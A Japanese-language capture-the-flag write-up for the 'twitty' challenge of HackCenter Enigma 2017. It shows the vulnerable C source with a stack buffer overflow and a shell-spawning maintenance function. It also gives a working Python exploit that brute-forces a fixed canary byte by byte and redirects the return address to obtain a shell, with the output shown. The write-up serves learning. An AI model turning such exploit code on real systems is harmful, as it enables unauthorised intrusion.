# twitty [170pt] (HackCenter Enigma 2017 Exploitation)

## Problem
Download the source for our new messaging service at twitty.c.  
We are running our own version online at: enigma2017.hackcenter.com:25500.  

HINTS  
Sylvester can get the canary, but only one bite at a time.  

## Write-up
指定されたipに接続し適当な文字列を送信すると、文字列の先頭に"Twit: "をつけてオウム返しするプログラムのようだった。ただ、帰ってきた文字列の後ろに謎の文字列が付いているためメモリリークが起きている可能性がある。
````
$ nc enigma2017.hackcenter 25500
AAAA
Twit: AAAA
�
````

ソースコードが与えられているため内容を確認する。  
main関数で最大256バイトreadし、post関数で読み取った文字列の先頭に"Twit: "を加え、文字列へのアドレスをリターンしている。
post関数では独自のカナリアを使用しており、単純なバッファオーバーフローを防いでいる。
また、/bin/bashを起動するmaintenance関数が用意されているため、制御をこの関数に飛ばしてやればよい問題のように見える。

twitty.c
````
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <signal.h>

void maintenance() {
  printf("MAINTENANCE MODE\n");
  fflush(stdout);
  system("/usr/bin/stdbuf -i0 -o0 -e0 /bin/bash");
}

char * prefix = "Twit: ";
char * post(uint8_t * msg, int len) {
  // Super long canaries for extra security
  unsigned long long canary = CANARY;
  char local[128];
  strcpy(local, prefix);
  // No need to worry about overflows since we compile with canaries
  memcpy(local+strlen(prefix), msg, len);
  if (canary != CANARY) {
    puts("Stack smashing detected\n");
    exit(1);
  }
  return strdup(local);
}

void handler(int sig) {

  exit(1);

}

int main(int argc, char ** argv) {
  uint8_t buffer[256];
  signal(SIGALRM, handler);
  alarm(2);
  int len = read(0, buffer, sizeof(buffer));
  char * format = post(buffer, len);
  printf("%s", format);
  fflush(stdout);
  exit(0);
}


// compile with gcc -m32 -fno-stack-protector -o twitty twitty.c
````

コードを見れば一目瞭然だがこのコードにはバグが有り、main関数で最大256バイト読取るのに対してpost関数のローカルバッファは128バイトしか用意していない。
そのため、122バイト(=128-strlen("Twit: ))バイトより大きい文字列を送ればバッファオーバーフローが可能となる。
この問題では、カナリアの値は固定値が入っているようなので、1バイトずつブルートフォースで求めることができる。
カナリアが判明したあとは普通にリターンアドレスをmaintenance関数へのアドレスに上書きしてやればいい。  
maintenance関数のアドレスはShellServerでソースコード末尾の通りにコンパイルしたあとで調べた。  
以下のコードをShellServer上で実行したらシェルが取れた。

solve.py
````
import struct, telnetlib, socket

def connect(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))
  return s

#bruteforce to detect canary
padding = 'A'*122
canary = ''
for i in range(8):
  for j in range(0, 256):
    tmp = struct.pack('B', j)
    s =  connect('localhost', 25500)
    buf = padding + canary + tmp
    s.send(buf)
    recv = s.recv(2048)
    if len(recv) > 30:
      print 'found: 0x%02x' % j
      canary += tmp
      s.close()
      break
    s.close()
print 'canary is 0x%08x' % struct.unpack('<Q', canary)[0]
#canary = '\x00\xa7\xda\xc4\xb0\xb5\x04\x00' #detected canary value

#overflow return address
maintenance = 0x0804862b #address of maintenance()
s = connect('localhost', 25500)
buf  = padding 
buf += canary
buf += 'A'*8  #padding
buf += struct.pack('<I', 0xdeadbeef) #old ebp
buf += struct.pack('<I', maintenance) #return address
s.send(buf)
print s.recv(1024)

t = telnetlib.Telnet()
t.sock = s
t.interact()
````

実行結果
````
found: 0x00                                                                            
found: 0xa7                                                                            
found: 0xda                                                                            
found: 0xc4                                                                            
found: 0xb0                                                                            
found: 0xb5                                                                            
found: 0x04                                                                            
found: 0x00                                                                            
canary is 0x4b5b0c4daa700                                                              
MAINTENANCE MODE                                                                       
                                                                                       
ls                                                                                     
key                                                                                    
twitty                                                                                 
twitty.c                                                                               
xinetd_wrapper.sh                                                                      
cat key                                                                                
xxxxxxxx
````
